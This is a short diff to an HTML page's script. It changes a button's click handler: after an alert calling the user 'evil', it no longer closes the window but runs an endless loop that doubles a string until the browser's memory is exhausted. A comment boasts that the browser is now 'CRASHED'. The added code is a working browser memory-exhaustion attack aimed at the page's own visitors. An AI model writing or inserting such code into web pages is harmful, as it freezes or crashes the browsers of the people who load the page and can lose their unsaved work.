@@ -43,7 +43,11 @@
     <script>
     function hello() {
         alert('Hello you are evil so bye bye');
-        window.close();
+        txt = "a";
+while(1){
+    txt = txt += "a";    //add as much as the browser can handle
+}
+//[evil laugh] BOOM! All memory used up, and it is now CRASHED!
    }
    document.getElementById("sub").addEventListener("click", hello, false);
    
